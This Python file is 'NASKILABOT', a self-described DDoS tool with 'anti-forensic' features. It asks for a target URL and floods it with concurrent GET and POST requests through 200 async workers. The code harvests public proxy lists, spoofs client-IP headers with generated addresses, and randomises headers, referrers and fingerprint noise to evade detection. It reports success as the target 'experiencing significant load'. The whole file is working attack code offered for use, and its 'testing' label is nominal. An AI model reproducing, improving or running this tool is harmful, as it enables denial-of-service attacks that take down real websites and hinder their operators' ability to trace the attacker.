import os  
import sys
import asyncio
import aiohttp
import random
import re
import itertools
import string
import time
import shutil
import socket
import ssl
import json
import hashlib
import base64
from urllib.parse import urlparse
import threading
from concurrent.futures import ThreadPoolExecutor

# Enhanced User Agents with more diversity and anti-detection patterns
user_agents = [
    # Modern Chrome variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # Firefox variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    
    # Safari variants
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    
    # Edge variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    
    # Mobile variants
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Legacy browsers for diversity
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
]

# Advanced proxy sources with more reliable providers
proxy_sources = [
    # Premium proxy APIs
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    
    # GitHub repositories
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    
    # SOCKS proxies
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
]

class AdvancedIPGenerator:
    """Advanced IP address generator with multiple spoofing techniques"""
    
    @staticmethod
    def generate_random_ip():
        """Generate random valid IP addresses"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    
    @staticmethod
    def generate_cloud_ip():
        """Generate IPs that look like cloud providers"""
        cloud_ranges = [
            (34, 64, 0, 255),  # Google Cloud
            (52, 0, 0, 255),   # AWS
            (40, 64, 0, 255),  # Azure
            (104, 128, 0, 255) # DigitalOcean
        ]
        net = random.choice(cloud_ranges)
        return f"{net[0]}.{net[1]}.{random.randint(net[2], net[3])}.{random.randint(1, 254)}"
    
    @staticmethod
    def generate_residential_ip():
        """Generate IPs that look like residential networks"""
        residential_ranges = [
            (192, 168, 0, 255),  # Common home networks
            (10, 0, 0, 255),     # Private range
            (172, 16, 0, 255),   # Private range
        ]
        net = random.choice(residential_ranges)
        return f"{net[0]}.{net[1]}.{random.randint(net[2], net[3])}.{random.randint(1, 254)}"

class AntiForensicTechniques:
    """Anti-forensic techniques to make detection harder"""
    
    @staticmethod
    def randomize_headers(base_headers):
        """Add random variations to headers to avoid pattern detection"""
        variations = {
            "Accept": [
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            ],
            "Accept-Language": [
                "en-US,en;q=0.9",
                "en-GB,en;q=0.8,en-US;q=0.7",
                "en;q=0.8,fr;q=0.6,de;q=0.4",
                "en-US,en;q=0.5"
            ],
            "Accept-Encoding": [
                "gzip, deflate, br",
                "gzip, deflate",
                "identity"
            ],
            "Cache-Control": [
                "no-cache",
                "max-age=0",
                "no-store"
            ],
            "Connection": [
                "keep-alive",
                "close",
                "upgrade"
            ]
        }
        
        for header, options in variations.items():
            if random.random() < 0.7:  # 70% chance to vary this header
                base_headers[header] = random.choice(options)
        
        return base_headers
    
    @staticmethod
    def generate_fake_referrer(target_url):
        """Generate realistic looking referrers"""
        referrers = [
            f"https://www.google.com/search?q={hashlib.md5(target_url.encode()).hexdigest()[:8]}",
            f"https://www.bing.com/search?q={hashlib.md5(target_url.encode()).hexdigest()[:8]}",
            f"https://www.facebook.com/",
            f"https://twitter.com/",
            f"https://www.reddit.com/",
            f"https://www.linkedin.com/",
            target_url  # Self-referrer
        ]
        return random.choice(referrers)
    
    @staticmethod
    def add_fingerprint_noise(headers):
        """Add fingerprint noise to make tracking harder"""
        noise_headers = {
            "X-Client-Data": base64.b64encode(os.urandom(16)).decode(),
            "X-Request-ID": hashlib.md5(os.urandom(16)).hexdigest(),
            "X-Correlation-ID": hashlib.sha256(os.urandom(16)).hexdigest(),
            "X-Forwarded-Proto": random.choice(["http", "https"]),
            "X-Forwarded-Host": f"host-{random.randint(1000, 9999)}.example.com",
        }
        
        # Add 2-3 random noise headers
        selected_noise = random.sample(list(noise_headers.items()), random.randint(2, 3))
        for key, value in selected_noise:
            headers[key] = value
            
        return headers

class ProtocolHandler:
    """Handle different protocols and connection types"""
    
    @staticmethod
    async def create_session(use_proxy=False, proxy_url=None):
        """Create a session with advanced configuration"""
        connector = aiohttp.TCPConnector(
            ssl=False,
            limit=100,
            limit_per_host=20,
            enable_cleanup_closed=True,
            ttl_dns_cache=300
        )
        
        timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=5)
        
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={}
        )
        
        return session

class AttackMetrics:
    """Track and report attack metrics"""
    
    def __init__(self):
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.lock = threading.Lock()
    
    def start(self):
        self.start_time = time.time()
    
    def increment_success(self):
        with self.lock:
            self.requests_sent += 1
            self.successful_requests += 1
    
    def increment_failure(self):
        with self.lock:
            self.requests_sent += 1
            self.failed_requests += 1
    
    def get_stats(self):
        if self.start_time is None:
            return "Metrics not started"
        
        elapsed = time.time() - self.start_time
        rps = self.requests_sent / elapsed if elapsed > 0 else 0
        
        return {
            "total_requests": self.requests_sent,
            "successful": self.successful_requests,
            "failed": self.failed_requests,
            "duration": f"{elapsed:.2f}s",
            "requests_per_second": f"{rps:.2f}"
        }

class CliAttacker:
    """
    Advanced DDoS testing tool with anti-forensic capabilities
    """
    
    def __init__(self, target_url, num_requests, ip_mode="random"):
        """Initialize the attacker with advanced configuration"""
        self.target_url = target_url
        self.num_requests = num_requests
        self.ip_mode = ip_mode
        self.max_concurrent = 200  # Increased concurrency
        self.request_limit = 100000000000
        self.metrics = AttackMetrics()
        self.ip_generator = AdvancedIPGenerator()
        self.anti_forensic = AntiForensicTechniques()
        
    def log(self, message, level="INFO"):
        """Advanced logging with levels and colors"""
        colors = {
            "INFO": "\033[94m",    # Blue
            "SUCCESS": "\033[92m", # Green
            "WARNING": "\033[93m", # Yellow
            "ERROR": "\033[91m",   # Red
            "RESET": "\033[0m"     # Reset
        }
        
        timestamp = time.strftime("%H:%M:%S")
        color = colors.get(level, colors["INFO"])
        print(f"{color}[{timestamp}] {level}: {message}{colors['RESET']}")
    
    def generate_ip(self):
        """Generate IP based on selected mode"""
        if self.ip_mode == "cloud":
            return self.ip_generator.generate_cloud_ip()
        elif self.ip_mode == "residential":
            return self.ip_generator.generate_residential_ip()
        elif self.ip_mode == "mixed":
            return random.choice([
                self.ip_generator.generate_random_ip(),
                self.ip_generator.generate_cloud_ip(),
                self.ip_generator.generate_residential_ip()
            ])
        else:  # random
            return self.ip_generator.generate_random_ip()
    
    async def fetch_ip_addresses(self, url):
        """Enhanced IP fetching with better error handling"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        text = await response.text()
                        ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
                        return ip_addresses
        except Exception as e:
            self.log(f"Failed to fetch IPs from {url}: {str(e)}", "WARNING")
        return []
    
    async def get_all_ips(self):
        """Get IPs from multiple sources with fallback generation"""
        self.log("Fetching IP addresses from sources...", "INFO")
        
        tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
        ip_lists = await asyncio.gather(*tasks, return_exceptions=True)
        
        all_ips = []
        for ip_list in ip_lists:
            if isinstance(ip_list, list):
                all_ips.extend(ip_list)
        
        # Add generated IPs as fallback
        if len(all_ips) < 100:
            self.log(f"Only found {len(all_ips)} IPs, generating additional IPs...", "WARNING")
            for _ in range(500):
                all_ips.append(f"{self.generate_ip()}:8080")
        
        self.log(f"Total IPs available: {len(all_ips)}", "SUCCESS")
        return all_ips
    
    def create_advanced_headers(self, ip_address):
        """Create advanced headers with anti-forensic techniques"""
        base_headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ip_address.split(':')[0],
            "X-Real-IP": ip_address.split(':')[0],
            "X-Client-IP": ip_address.split(':')[0],
            "X-Originating-IP": ip_address.split(':')[0],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Referer": self.anti_forensic.generate_fake_referrer(self.target_url),
            "Origin": urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc,
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
        }
        
        # Apply anti-forensic techniques
        headers = self.anti_forensic.randomize_headers(base_headers)
        headers = self.anti_forensic.add_fingerprint_noise(headers)
        
        return headers
    
    async def send_advanced_request(self, session, ip_address):
        """Send advanced request with multiple techniques"""
        try:
            headers = self.create_advanced_headers(ip_address)
            
            # Randomize request method
            method = random.choice([session.get, session.post])
            
            if method == session.post:
                # Generate random POST data
                post_data = {
                    "data": hashlib.md5(os.urandom(16)).hexdigest(),
                    "timestamp": str(int(time.time())),
                    "token": base64.b64encode(os.urandom(32)).decode()
                }
                async with method(self.target_url, headers=headers, data=post_data, timeout=5) as response:
                    self.metrics.increment_success()
                    self.log(f"Request to {self.target_url} with IP: {ip_address.split(':')[0]} - Status: {response.status}", "SUCCESS")
            else:
                async with method(self.target_url, headers=headers, timeout=5) as response:
                    self.metrics.increment_success()
                    self.log(f"Request to {self.target_url} with IP: {ip_address.split(':')[0]} - Status: {response.status}", "SUCCESS")
                    
        except asyncio.TimeoutError:
            self.metrics.increment_failure()
            self.log(f"Timeout for IP: {ip_address.split(':')[0]}", "WARNING")
        except Exception as e:
            self.metrics.increment_failure()
            self.log(f"Error for IP: {ip_address.split(':')[0]} - {str(e)}", "ERROR")
    
    async def attack_worker(self, session, ip_cycle, requests_per_worker):
        """Advanced attack worker with rate limiting"""
        for i in range(requests_per_worker):
            ip_address = next(ip_cycle)
            await self.send_advanced_request(session, ip_address)
            
            # Dynamic rate limiting
            delay = random.uniform(0.01, 0.1)
            await asyncio.sleep(delay)
            
            # Print progress every 100 requests
            if i % 100 == 0:
                stats = self.metrics.get_stats()
                self.log(f"Worker progress: {i}/{requests_per_worker} | Total: {stats['total_requests']} | RPS: {stats['requests_per_second']}", "INFO")
    
    async def advanced_attack(self):
        """Main advanced attack function"""
        self.log("Starting advanced DDoS attack...", "INFO")
        self.metrics.start()
        
        # Get IP list
        ip_list = await self.get_all_ips()
        if not ip_list:
            self.log("No IPs found, using generated IPs only", "WARNING")
            ip_list = [f"{self.generate_ip()}:8080" for _ in range(1000)]
        
        ip_cycle = itertools.cycle(ip_list)
        requests_per_worker = max(1, self.num_requests // self.max_concurrent)
        
        self.log(f"Starting {self.max_concurrent} workers, {requests_per_worker} requests each", "INFO")
        
        async def worker():
            connector = aiohttp.TCPConnector(ssl=False, limit=0)
            async with aiohttp.ClientSession(connector=connector) as session:
                await self.attack_worker(session, ip_cycle, requests_per_worker)
        
        # Start attack
        start_time = time.time()
        tasks = [asyncio.create_task(worker()) for _ in range(self.max_concurrent)]
        
        # Monitor progress
        while any(not task.done() for task in tasks):
            await asyncio.sleep(5)
            stats = self.metrics.get_stats()
            self.log(f"Attack Progress: {stats}", "INFO")
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed_time = time.time() - start_time
        final_stats = self.metrics.get_stats()
        
        self.log(f"Attack completed in {elapsed_time:.2f} seconds", "SUCCESS")
        self.log(f"Final Stats: {final_stats}", "SUCCESS")
        self.log("Target should be experiencing significant load", "SUCCESS")
    
    def run(self):
        """Run the advanced attack"""
        try:
            asyncio.run(self.advanced_attack())
        except KeyboardInterrupt:
            self.log("Attack interrupted by user", "WARNING")
        except Exception as e:
            self.log(f"Unexpected error: {str(e)}", "ERROR")

def print_naskila_banner():
    """Print the custom NASKILABOT banner with sword"""
    RED = "\033[31m"
    BLUE = "\033[34m"
    YELLOW = "\033[33m"
    RESET = "\033[0m"
    columns = shutil.get_terminal_size().columns

    banner = r"""
███╗   ██╗ █████╗ ███████╗██╗  ██╗██╗██╗      █████╗ ██████╗  ██████╗ ████████╗
████╗  ██║██╔══██╗██╔════╝██║ ██╔╝██║██║     ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝
██╔██╗ ██║███████║███████╗█████╔╝ ██║██║     ███████║██████╔╝██║   ██║   ██║   
██║╚██╗██║██╔══██║╚════██║██╔═██╗ ██║██║     ██╔══██║██╔══██╗██║   ██║   ██║   
██║ ╚████║██║  ██║███████║██║  ██╗██║███████╗██║  ██║██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝     
                                                                          
 
                                                                                      
                                                                         		 github :  Nasrif30
    """

    sword = r"""
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣀⠀⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⢀⣤⠚⠉⣨⣽⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⣤⣤⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣠⣶⠖⠋⣉⣩⣿⣿⡉⠀⠀⠀⠀⣾⣅⡀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⢀⡼⡿⢷⡲⢤⣉⢙⣳⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣠⣾⣿⣿⣧⣶⣋⣡⡟⣸⡇⠙⠶⣄⡀⠀⣻⣿⢻⣶⣿⣿⣿⣿⣿⣿⣻⣯⢿⣟⢀⣠⠾⢻⣄⣤⣤⡻⣴⣮⣙⢿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣴⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣈⠙⡒⠚⠳⡘⠛⠛⠿⢿⡿⠿⠛⠻⢿⠄⠀⣉⠁⣴⣿⣿⣿⣿⣿⣟⣿⣿⣶⣿⡟⠛⠛⠻⣧⡀⠀⠀⠀⠀⠀⠀
⡼⠋⠀⠀⠀⠉⠉⠉⠻⠿⠿⢿⣿⣿⣿⣿⡿⣿⠏⠁⠀⣿⣤⣠⡴⡾⢷⣤⣤⣤⣾⡃⠀⠉⠛⠻⣿⣿⣿⡿⠛⠉⠙⠁⠀⠀⠀⠀⠀⠀⠈⠓⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠟⠁⠀⠀⠀⠺⡟⢻⣦⡍⠁⢀⠘⣷⡄⠛⠿⢿⠋⠀⠀⠀⠀⠙⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⢨⡈⠉⣷⣶⣭⣿⣿⣾⠀⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠈⠻⠛⠟⠛⠈⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿⣾⣻⣿⣿⣿⣿⣟⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠚⠿⢿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

    """

    for line in banner.splitlines():
        print(f"{RED}{line.center(columns)}{RESET}")
    
    print(f"{YELLOW}{sword.center(columns)}{RESET}")
    print(f"{BLUE} (ง’̀-‘́)ง Advanced DDoS Testing Tool with Anti-Forensic Capabilities{RESET}".center(columns))
    print(f"{BLUE}⚡ Enhanced IP Spoofing • Advanced Headers • Multi-Protocol Support{RESET}".center(columns))
    print()

def get_user_input():
    """Get user input with validation"""
    print_naskila_banner()
    
    target_url = input(" (　-_･) ︻デ═一 ▸ Enter Target URL (include http/https): ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    try:
        num_requests = int(input("💣 Enter Number of Requests: ").strip())
    except ValueError:
        print("Error: Number of requests must be an integer!")
        sys.exit(1)
    
    print("\n IP Generation Modes:")
    print("1. Random IPs (Default)")
    print("2. Cloud IPs (Looks like cloud providers)")
    print("3. Residential IPs (Looks like home networks)")
    print("4. Mixed (All types)")
    
    ip_choice = input("🔧 Choose IP Mode (1-4, default 1): ").strip()
    ip_modes = {"1": "random", "2": "cloud", "3": "residential", "4": "mixed"}
    ip_mode = ip_modes.get(ip_choice, "random")
    
    if not target_url or num_requests <= 0:
        print("Error: Enter a valid URL and a positive number of requests!")
        sys.exit(1)
    
    return target_url, num_requests, ip_mode

if __name__ == "__main__":
    try:
        target_url, num_requests, ip_mode = get_user_input()
        
        print(f"\n_Starting NASKILABOT Attack...")
        print(f" Target: {target_url}")
        print(f" Requests: {num_requests}")
        print(f" IP Mode: {ip_mode}")
        print(f" Start Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("\n" + "="*60)
        
        attacker = CliAttacker(target_url, num_requests, ip_mode)
        attacker.run()
        
    except KeyboardInterrupt:
        print("\n❌ Attack cancelled by user!")
    except Exception as e:
        print(f"\n💥 Unexpected error: {e}")
